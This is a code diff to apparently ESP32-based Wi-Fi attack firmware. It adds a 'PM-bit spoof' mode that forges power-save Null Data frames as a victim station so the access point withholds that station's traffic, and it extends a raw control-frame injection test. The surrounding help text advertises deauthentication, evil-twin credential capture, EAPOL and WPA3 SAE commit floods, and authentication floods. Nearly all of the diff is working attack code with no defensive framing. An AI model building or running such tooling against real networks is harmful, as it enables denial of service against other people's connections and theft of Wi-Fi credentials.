@@ -14,6 +14,7 @@
 #include "deauth.h"
 #include "delba.h"
 #include "eapol.h"
+#include "pspoll.h"
 #include "sae.h"
 #include "tim.h"
 #include "tx_guard.h"
@@ -73,9 +74,9 @@ const char* attack_mode_label() {
 
 const char* capabilities() {
 #if CONFIG_SOC_WIFI_SUPPORT_5G
-  return "deauth,eviltwin,probe,5g,wnm,tim,eapol,sae,authflood";
+  return "deauth,eviltwin,probe,5g,wnm,tim,eapol,pspoll,sae,authflood";
 #else
-  return "deauth,eviltwin,probe,wnm,tim,eapol,sae,authflood";
+  return "deauth,eviltwin,probe,wnm,tim,eapol,pspoll,sae,authflood";
 #endif
 }
 
@@ -107,7 +108,7 @@ void print_help() {
   Serial.println("INFO EVILTWIN <idx> / EVILTWIN_STOP / CREDS");
   Serial.println("INFO TOUCH / CALIBRATE             LVGL touch readback / recalibrate");
   Serial.println("INFO UITARGETS / UI                LVGL target popup: open / report state");
-  Serial.println("INFO UISCREEN <name>               switch the LVGL screen (menu/deauth/mode/probe/csa/delba/ba/evil/wnm/tim/eapol/sae/authflood)");
+  Serial.println("INFO UISCREEN <name>               switch the LVGL screen (menu/deauth/mode/probe/csa/delba/ba/evil/wnm/tim/eapol/pspoll/sae/authflood)");
   Serial.println("INFO RXMIX                         received frame mix (beacon/probe/deauth/ctrl/data)");
   Serial.println("INFO REASON [1-65535|random]       deauth reason code: fixed, random per burst, or report");
   Serial.println("INFO CSA <idx> [ch] [cnt] [secs]   CSA spoof; no ch/auto = random opposite-band channel, loops");
@@ -131,6 +132,10 @@ void print_help() {
   Serial.println("INFO EAPOL <idx> [tid|-1] [sta-mac] EAPOL-Start/Logoff flood as a forged station");
   Serial.println("INFO EAPOLSTOP                     stop the EAPOL flood");
   Serial.println("INFO EAPOLTEST                     dump the EAPOL data frames (format check)");
+  Serial.println("INFO PSPOLL <idx> [sta-mac]        PM-bit spoof: forged PM=1 Null Data");
+  Serial.println("INFO PSPOLLREL                     send PM=0 to every victim, then stop");
+  Serial.println("INFO PSPOLLSTOP                    stop the PM-bit spoof");
+  Serial.println("INFO PSPOLLTEST                    dump the PM=1 / PM=0 Null Data bytes");
   Serial.println("INFO SAE <idx> [point|rand] [gap_ms]  SAE Commit flood (WPA3), echoes anti-clogging token");
   Serial.println("INFO SAESTOP                       stop the SAE flood");
   Serial.println("INFO SAETEST                       dump the SAE Commit bytes (format check)");
@@ -140,7 +145,7 @@ void print_help() {
   Serial.println("INFO RESTART                       esp_restart() (recovery from an exhausted TX pool)");
   Serial.println("INFO MON <ch> <secs>               passive capture on one channel (ch=0 hops 1..13)");
   Serial.println("INFO RADIO                         dump the driver's sniffer state (promisc + both filters + channel)");
-  Serial.println("INFO CTRLTEST                      inject 10 RTS control frames (can this radio report control frames at all?)");
+  Serial.println("INFO CTRLTEST [subtype] [broadcast|bssid] [dur]  10 control frames of that subtype (default RTS=11)");
   Serial.println("INFO CTRLFILTER [hex|all|none]     2nd-stage control-subtype filter: report or set it");
   Serial.println("INFO UIREASON / UI                 LVGL reason popup: open / report state");
 }
@@ -397,6 +402,24 @@ void do_status() {
   Serial.print((unsigned)eapol_rx_eap_packets());
   Serial.print(" eaprxsta=");
   Serial.print((unsigned)eapol_rx_from_sta());
+  Serial.print(" psp=");
+  Serial.print(pspoll_mode_name());
+  Serial.print(" pspf=");
+  Serial.print((unsigned)pspoll_frames());
+  Serial.print(" pspnul=");
+  Serial.print((unsigned)pspoll_null_frames());
+  Serial.print(" pspfl=");
+  Serial.print((unsigned)pspoll_flush_frames());
+  Serial.print(" pspc=");
+  Serial.print((unsigned)pspoll_clients());
+  Serial.print(" pspdl=");
+  Serial.print((unsigned)pspoll_dl_frames());
+  Serial.print(" psprxp=");
+  Serial.print((unsigned)pspoll_rx_polls());
+  Serial.print(" psprxn=");
+  Serial.print((unsigned)pspoll_rx_nulls());
+  Serial.print(" psprxpm=");
+  Serial.print((unsigned)pspoll_rx_pm1());
   Serial.print(" sae=");
   Serial.print(sae_active() ? "on" : "off");
   Serial.print(" saesec=");
@@ -628,15 +651,42 @@ void do_ctrl_filter(char* token) {
                 (unsigned)readback.filter_mask, (int)err);
 }
 
-void do_ctrl_test() {
+// Control-frame TX probe: subtype, receiver address and Duration/ID are all
+// parameters, because each of them turned out to matter for whether a PS-Poll
+// reaches the air (测试报告 §4.4.9). Same frame length for every variant, so only
+// the field under test changes.
+void do_ctrl_test(char* sub_token, char* ra_token, char* dur_token) {
+  long subtype = sub_token ? strtol(sub_token, nullptr, 0) : 11;
+  if (subtype < 0 || subtype > 15) {
+    Serial.println("ERR usage: CTRLTEST [subtype 0-15] [broadcast|bssid] [duration]");
+    return;
+  }
+  const bool to_bssid = token_iequals(ra_token, "bssid");
+  const long dur = dur_token ? strtol(dur_token, nullptr, 0) : 0;
+  if (dur < 0 || dur > 0xFFFF) {
+    Serial.println("ERR duration must be 0..0xFFFF");
+    return;
+  }
   uint8_t rts[16];
   int sent = 0;
   for (int i = 0; i < 10; i++) {
     memset(rts, 0, sizeof(rts));
-    rts[0] = 0xB4;  // control frame, subtype 11 = RTS
+    rts[0] = (uint8_t)(0x04 | ((subtype & 0x0F) << 4));  // control frame, subtype
     rts[1] = 0x00;
-    memset(rts + 4, 0xFF, 6);          // RA = broadcast
-    rts[10] = 0x02;                    // TA = locally administered placeholder
+    rts[2] = (uint8_t)(dur & 0xFF);
+    rts[3] = (uint8_t)((dur >> 8) & 0xFF);
+    if (to_bssid) {
+      // needs a target: the AP of the last scan entry
+      const uint8_t* bssid = g_scan_count > 0 ? WiFi.BSSID((uint8_t)0) : nullptr;
+      if (bssid == nullptr) {
+        Serial.println("ERR CTRLTEST bssid: run SCAN first");
+        return;
+      }
+      memcpy(rts + 4, bssid, 6);
+    } else {
+      memset(rts + 4, 0xFF, 6);  // RA = broadcast
+    }
+    rts[10] = 0x02;  // TA = locally administered placeholder
     rts[11] = 0x00;
     rts[12] = 0x00;
     rts[13] = 0xAA;
@@ -647,8 +697,8 @@ void do_ctrl_test() {
     }
     delay(5);
   }
-  Serial.print("OK CTRLTEST sent=");
-  Serial.println(sent);
+  Serial.printf("OK CTRLTEST subtype=%ld ra=%s dur=0x%04X sent=%d\n", subtype,
+                to_bssid ? "bssid" : "broadcast", (unsigned)dur, sent);
 }
 
 void do_radio() {
@@ -915,6 +965,73 @@ void do_eapol_stop() {
   Serial.printf("OK EAPOLSTOP frames=%u rx_ap=%u rx_sta=%u eap=%u\n", (unsigned)frames,
                 (unsigned)rx, (unsigned)rxsta, (unsigned)eapol_rx_eap_packets());
   ui_log("eapol stopped");
+}
+
+// ---- power-management (PS bit) spoof ----
+// Arguments (order free): the index, and an optional victim MAC. Anything else is
+// rejected: the PS-Poll half of this attack was removed (a unicast control subtype
+// 10 never leaves this MAC), so there is no aid/mode to select any more.
+void do_pspoll(int index, char* first, char* second) {
+  if (index < 0 || index >= g_scan_count) {
+    Serial.println("ERR index out of range, run SCAN first");
+    return;
+  }
+  uint8_t sta[6];
+  bool have_sta = false;
+  char* tokens[2] = {first, second};
+  for (int i = 0; i < 2; i++) {
+    char* token = tokens[i];
+    if (token == nullptr) continue;
+    if (parse_mac(token, sta)) {
+      have_sta = true;
+    } else {
+      Serial.printf("ERR unknown PSPOLL argument '%s' (usage: PSPOLL <idx> [sta-mac])\n",
+                    token);
+      return;
+    }
+  }
+  attack_stop();
+  if (!pspoll_start(index)) {
+    Serial.println("ERR cannot start the PM-bit spoof on that network");
+    return;
+  }
+  char sta_text[18];
+  sta_text[0] = 0;
+  if (have_sta) {
+    pspoll_add_station(sta);
+    mac_to_str(sta, sta_text);
+  }
+  const int32_t chan_err = pspoll_channel_err();
+  Serial.printf("OK PSPOLL %d mode=%s sta=%s ch=%u chset=%d ssid=%s\n", index,
+                pspoll_mode_name(), sta_text[0] ? sta_text : "learned",
+                (unsigned)WiFi.channel(index), (int)chan_err, WiFi.SSID(index).c_str());
+  if (chan_err != 0) {
+    Serial.printf("WARN chset=%d: the channel change was refused (a scan still running?),"
+                  " frames go out on the current channel\n", (int)chan_err);
+  }
+  ui_log("pm-bit spoof started");
+}
+
+void do_pspoll_stop() {
+  const uint32_t frames = pspoll_frames();
+  const uint32_t nulls = pspoll_null_frames();
+  const uint32_t flushes = pspoll_flush_frames();
+  const uint32_t dl = pspoll_dl_frames();
+  pspoll_stop();
+  Serial.printf("OK PSPOLLSTOP frames=%u null=%u flush=%u dl=%u\n", (unsigned)frames,
+                (unsigned)nulls, (unsigned)flushes, (unsigned)dl);
+  ui_log("pm-bit spoof stopped");
+}
+
+// Undo: one PM=0 Null Data per victim, then stop. The AP then hands the frames it
+// has been holding to a station that is still not listening.
+void do_pspoll_release() {
+  const uint32_t clients = pspoll_clients();
+  const uint32_t before = pspoll_flush_frames();
+  pspoll_release();
+  Serial.printf("OK PSPOLLREL clients=%u flushed=%u\n", (unsigned)clients,
+                (unsigned)(pspoll_flush_frames() - before));
+  ui_log("pm=0 release sent");
 }
 
 // ---- SAE commit flood ----
@@ -1334,11 +1451,11 @@ void do_ui_state() {
 void do_ui_screen(char* token) {
 #if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
   if (token == nullptr) {
-    Serial.println("ERR usage: UISCREEN <menu|deauth|mode|probe|csa|delba|ba|evil|wnm|tim|eapol|sae|authflood>");
+    Serial.println("ERR usage: UISCREEN <menu|deauth|mode|probe|csa|delba|ba|evil|wnm|tim|eapol|pspoll|sae|authflood>");
     return;
   }
   if (!wireless_ui_show_by_name(token)) {
-    Serial.println("ERR unknown screen, try: menu deauth mode probe csa delba ba evil wnm tim eapol sae authflood");
+    Serial.println("ERR unknown screen, try: menu deauth mode probe csa delba ba evil wnm tim eapol pspoll sae authflood");
     return;
   }
   Serial.print("OK UISCREEN ");
@@ -1490,6 +1607,17 @@ void dispatch(char* line) {
     do_eapol_stop();
   } else if (strcmp(command, "EAPOLTEST") == 0) {
     eapol_selftest();
+  } else if (strcmp(command, "PSPOLL") == 0) {
+    char* idx_token = strtok(nullptr, " \t");
+    char* first = strtok(nullptr, " \t");
+    char* second = strtok(nullptr, " \t");
+    do_pspoll(parse_index(idx_token), first, second);
+  } else if (strcmp(command, "PSPOLLREL") == 0) {
+    do_pspoll_release();
+  } else if (strcmp(command, "PSPOLLSTOP") == 0) {
+    do_pspoll_stop();
+  } else if (strcmp(command, "PSPOLLTEST") == 0) {
+    pspoll_selftest();
   } else if (strcmp(command, "SAE") == 0) {
     char* idx_token = strtok(nullptr, " \t");
     char* elem_token = strtok(nullptr, " \t");
@@ -1511,7 +1639,10 @@ void dispatch(char* line) {
   } else if (strcmp(command, "CTRLFILTER") == 0) {
     do_ctrl_filter(strtok(nullptr, " 	"));
   } else if (strcmp(command, "CTRLTEST") == 0) {
-    do_ctrl_test();
+    char* sub_token = strtok(nullptr, " \t");
+    char* ra_token = strtok(nullptr, " \t");
+    char* dur_token = strtok(nullptr, " \t");
+    do_ctrl_test(sub_token, ra_token, dur_token);
   } else if (strcmp(command, "RADIO") == 0) {
     do_radio();
   } else if (strcmp(command, "MON") == 0) {
